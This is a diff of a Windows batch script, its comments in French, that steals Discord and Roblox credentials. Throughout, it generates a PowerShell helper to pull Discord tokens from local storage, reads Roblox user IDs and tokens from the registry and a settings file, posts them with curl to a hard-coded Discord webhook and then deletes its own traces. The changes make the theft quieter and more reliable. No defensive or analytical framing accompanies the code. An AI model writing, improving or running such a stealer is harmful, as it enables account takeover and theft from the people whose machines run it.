@@ -1,11 +1,12 @@
 @echo off
 setlocal enabledelayedexpansion
-:: PALOFSC - EXFILTRATION FINALE (POWERSHELL ROBUSTE)
+:: PALOFSC - EXFILTRATION SANS MESSAGES INDESIRABLES
 
 set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"
 
-:: ETAPE 1 : CREATION D'UN SCRIPT POWERSHELL TEMPORAIRE POUR EXTRAIRE LES TOKENS
+:: ETAPE 1 : CREATION DU SCRIPT POWERSHELL POUR EXTRAIRE LES TOKENS (sortie vers fichier)
 set "psfile=%TEMP%\extract.ps1"
+set "outfile=%TEMP%\tokens.txt"
 (
 echo $paths = @(
 echo     "$env:APPDATA\Discord\Local Storage\leveldb",
@@ -20,14 +21,21 @@ echo             Select-String -Path $_.FullName -Pattern '[a-zA-Z0-9_\-]{24,28}
 echo         } ^| ForEach-Object { $tokens += $_ }
 echo     }
 echo }
-echo $tokens -join ' '
+echo $tokens -join ' ' ^| Out-File -FilePath '%outfile%' -Encoding utf8
 ) > "%psfile%"
 
-:: ETAPE 2 : EXECUTER LE SCRIPT POWERSHELL ET RECUPERER LA SORTIE
-for /f "delims=" %%a in ('powershell -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2^>nul') do set "tokens=%%a"
+:: ETAPE 2 : EXECUTION DU SCRIPT POWERSHELL (redirection des erreurs vers nul)
+powershell -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul
+
+:: ETAPE 3 : LECTURE DU FICHIER DE TOKENS (si existe et non vide)
+set "tokens="
+if exist "%outfile%" (
+    for /f "usebackq delims=" %%a in ("%outfile%") do set "tokens=%%a"
+    del /f /q "%outfile%" >nul 2>&1
+)
 del /f /q "%psfile%" >nul 2>&1
 
-:: ETAPE 3 : RECUPERATION DES DONNEES ROBLOX (registre + fichier XML)
+:: ETAPE 4 : RECUPERATION DES DONNEES ROBLOX (registre + fichier XML)
 set "roblox_user="
 set "roblox_pass="
 set "roblox_token="
@@ -37,7 +45,7 @@ if exist "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" (
   for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" 2^>nul') do set "roblox_token=%%a"
 )
 
-:: ETAPE 4 : CONSTRUCTION DU MESSAGE
+:: ETAPE 5 : CONSTRUCTION DU MESSAGE
 set "msg="
 if not "!tokens!"=="" set "msg=!msg!Tokens Discord : !tokens!\n"
 if not "!roblox_user!"=="" set "msg=!msg!Roblox UserID : !roblox_user!\n"
@@ -49,10 +57,10 @@ if "!msg!"=="" set "msg=Aucune donnee collectee.\n"
 set "msg=!msg:"=\"!"
 set "msg=!msg:\n=\\n!"
 
-:: ETAPE 5 : ENVOI VIA CURL
+:: ETAPE 6 : ENVOI VIA CURL
 curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1
 
-:: ETAPE 6 : NETTOYAGE ET SUPPRESSION
+:: ETAPE 7 : NETTOYAGE ET AUTO-SUPPRESSION
 set "tokens="
 set "roblox_user="
 set "roblox_pass="
